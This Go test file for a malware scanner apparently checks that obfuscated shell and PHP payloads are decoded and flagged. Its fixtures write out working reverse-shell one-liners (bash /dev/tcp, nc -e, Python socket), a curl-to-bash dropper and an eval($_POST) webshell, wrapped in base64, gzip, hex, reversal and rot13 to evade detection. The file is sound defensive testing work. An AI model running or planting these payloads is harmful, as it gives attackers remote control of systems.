package scanner_test

import (
	"bytes"
	"compress/gzip"
	"context"
	"encoding/base64"
	"fmt"
	"strings"
	"testing"

	"aether/internal/config"
	"aether/internal/report"
	"aether/internal/scanner"
	"aether/internal/yara"
)

func gzipCompress(data []byte) []byte {
	var buf bytes.Buffer
	w := gzip.NewWriter(&buf)
	_, _ = w.Write(data)
	_ = w.Close()
	return buf.Bytes()
}

func TestDecodeAndRescan_Base64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// 1. Base64 encoded reverse shell
	rawShell := "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(rawShell))
	scriptContent := []byte(fmt.Sprintf("#!/bin/bash\necho %s | base64 -d | bash\n", b64Encoded))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/rev.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected Script_Obfuscated_Payload match for base64 encoded reverse shell")
	}
	if match.Name != "Script_Obfuscated_Payload" {
		t.Errorf("expected rule Script_Obfuscated_Payload, got %s", match.Name)
	}
	if match.Severity != report.SeverityAlert {
		t.Errorf("expected Alert severity, got %s", match.Severity)
	}
	if len(layers) == 0 || layers[0] != "base64" {
		t.Errorf("expected layers to start with base64, got %v", layers)
	}
}

func TestDecodeAndRescan_DoubleBase64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	rawShell := "nc -e /bin/sh 192.168.1.100 9001"
	layer1 := base64.StdEncoding.EncodeToString([]byte(rawShell))
	layer2 := base64.StdEncoding.EncodeToString([]byte(layer1))
	scriptContent := []byte(fmt.Sprintf("#!/bin/bash\nDATA=\"%s\"\necho $DATA | base64 -d | base64 -d | sh\n", layer2))

	match, layers := scanner.DecodeAndRescan(ctx, "/var/tmp/staged.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected match for double-base64 encoded payload")
	}
	if len(layers) < 2 {
		t.Fatalf("expected at least 2 layers of de-obfuscation, got %v", layers)
	}
	if layers[0] != "base64" || layers[1] != "base64" {
		t.Errorf("expected layers [base64, base64], got %v", layers)
	}
}

func TestDecodeAndRescan_GzipBase64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	rawShell := "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
	compressed := gzipCompress([]byte(rawShell))
	b64Encoded := base64.StdEncoding.EncodeToString(compressed)
	scriptContent := []byte(fmt.Sprintf("#!/bin/sh\necho '%s' | base64 -d | gunzip | sh\n", b64Encoded))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/compressed_payload.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected match for base64+gzip compressed payload")
	}
	if len(layers) < 2 {
		t.Fatalf("expected at least 2 decode layers, got %v", layers)
	}
	// Layers order: outer base64, then inner gzip
	if layers[0] != "base64" || layers[1] != "gzip" {
		t.Errorf("expected layers [base64, gzip], got %v", layers)
	}
}

func TestDecodeAndRescan_HexEscape(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	rawShell := "/bin/bash -i >& /dev/tcp/1.2.3.4/8080 0>&1"
	var hexEscaped string
	for _, b := range []byte(rawShell) {
		hexEscaped += fmt.Sprintf("\\x%02x", b)
	}
	scriptContent := []byte(fmt.Sprintf("#!/bin/sh\nprintf '%s' | sh\n", hexEscaped))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/hex_shell.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected match for hex-escaped reverse shell")
	}
	if len(layers) == 0 || layers[0] != "hex" {
		t.Errorf("expected layers to start with hex, got %v", layers)
	}
}

func TestDecodeAndRescan_BenignBase64(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// Benign base64 string (e.g. a logo or license string)
	benignText := "This is a completely normal documentation string explaining how to build software packages on Debian GNU/Linux."
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(benignText))
	scriptContent := []byte(fmt.Sprintf("# Benign README\n# Base64 hash: %s\n", b64Encoded))

	match, layers := scanner.DecodeAndRescan(ctx, "/usr/share/doc/package/README", scriptContent, nil, cfg, nil)
	if match != nil {
		t.Fatalf("expected nil for benign base64 text, got match %v with layers %v", match, layers)
	}
}

func TestDecodeAndRescan_ContextCancellation(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx, cancel := context.WithCancel(context.Background())
	cancel() // Cancel immediately

	rawShell := "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(rawShell))

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/test.sh", []byte(b64Encoded), nil, cfg, nil)
	if match != nil || layers != nil {
		t.Fatalf("expected nil when context is canceled, got %v", match)
	}
}

func TestDecodeAndRescan_RevEcho(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// Reversed interactive bash reverse shell:
	// "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1" backwards is:
	// "1&>0 4444/1.0.0.01/pct/ved/ &> i- hsab"
	scriptContent := []byte("#!/bin/sh\necho '1&>0 4444/1.0.0.01/pct/ved/ &> i- hsab' | rev | bash\n")

	match, layers := scanner.DecodeAndRescan(ctx, "/tmp/rev_evasion.sh", scriptContent, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected Script_Obfuscated_Payload match for reversed bash reverse shell")
	}
	if len(layers) == 0 || layers[0] != "rev" {
		t.Errorf("expected layers to start with rev, got %v", layers)
	}
	if match.Severity != report.SeverityAlert {
		t.Errorf("expected ALERT severity, got %s", match.Severity)
	}
}

func TestDecodeAndRescan_Rot13Webshell(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// str_rot13("eval($_POST['cmd']);") -> "riny($_CBFG['pzq']);"
	phpScript := []byte("<?php\n$code = str_rot13('riny($_CBFG[\"pzq\"]);');\neval($code);\n?>\n")

	match, layers := scanner.DecodeAndRescan(ctx, "/var/www/html/rot.php", phpScript, nil, cfg, nil)
	if match == nil {
		t.Fatalf("expected Script_Obfuscated_Payload match for rot13 webshell")
	}
	if len(layers) == 0 || layers[0] != "rot13" {
		t.Errorf("expected layers to start with rot13, got %v", layers)
	}
}

type mockYaraScannerForDecode struct {
	targetMatched bool
}

func (m *mockYaraScannerForDecode) Scan(target yara.ScanTarget) ([]yara.RuleMatch, error) {
	if bytes.Contains(target.Data, []byte("SPECIAL_MALICIOUS_IMPLANT_TOKEN")) {
		m.targetMatched = true
		return []yara.RuleMatch{
			{
				RuleName: "Linux_Implant_Custom_Family",
				Severity: report.SeverityAlert,
				Score:    90,
			},
		}, nil
	}
	return nil, nil
}

func (m *mockYaraScannerForDecode) Destroy() {}

func TestDecodeAndRescanWithYARA(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// Payload with special YARA implant token encoded in base64
	implantPayload := "#!/bin/sh\nexport TOKEN=SPECIAL_MALICIOUS_IMPLANT_TOKEN\n"
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(implantPayload))
	scriptContent := []byte(fmt.Sprintf("#!/bin/sh\necho '%s' | base64 -d | sh\n", b64Encoded))

	mockY := &mockYaraScannerForDecode{}
	matches, layers, yMatches := scanner.DecodeAndRescanWithYARA(ctx, "/tmp/implant.sh", scriptContent, nil, cfg, nil, mockY)

	if len(matches) == 0 {
		t.Fatalf("expected match for base64 encoded YARA target")
	}
	if len(layers) == 0 || layers[0] != "base64" {
		t.Errorf("expected layers to start with base64, got %v", layers)
	}
	if !mockY.targetMatched {
		t.Errorf("expected YARA scanner to have scanned and matched the decoded payload buffer")
	}
	if len(yMatches) == 0 || yMatches[0].RuleName != "Linux_Implant_Custom_Family" {
		t.Errorf("expected YARA match Linux_Implant_Custom_Family, got %v", yMatches)
	}
}

func TestDecodeAndRescan_MultiSignalAggregated(t *testing.T) {
	cfg := config.NewDefaultConfig()
	ctx := context.Background()

	// Decoded payload contains both a reverse shell AND a download-and-execute command
	multiPayload := `#!/bin/bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
curl -s http://192.168.1.50/dropper.sh | bash
`
	b64Encoded := base64.StdEncoding.EncodeToString([]byte(multiPayload))
	scriptContent := []byte(fmt.Sprintf("#!/bin/bash\necho '%s' | base64 -d | bash\n", b64Encoded))

	matches, layers, _ := scanner.DecodeAndRescanWithYARA(ctx, "/tmp/multi.sh", scriptContent, nil, cfg, nil, nil)
	if len(matches) < 2 {
		t.Fatalf("expected at least 2 aggregated heuristic matches from decoded stream, got %d", len(matches))
	}
	if len(layers) == 0 || layers[0] != "base64" {
		t.Errorf("expected base64 layer, got %v", layers)
	}

	foundRevShell := false
	foundDropper := false
	for _, m := range matches {
		if strings.Contains(m.Reason, "Script_Reverse_Shell") {
			foundRevShell = true
		}
		if strings.Contains(m.Reason, "Script_Download_And_Execute") {
			foundDropper = true
		}
	}
	if !foundRevShell {
		t.Errorf("expected multi-signal scan to detect Script_Reverse_Shell in decoded stream")
	}
	if !foundDropper {
		t.Errorf("expected multi-signal scan to detect Script_Download_And_Execute in decoded stream")
	}
}
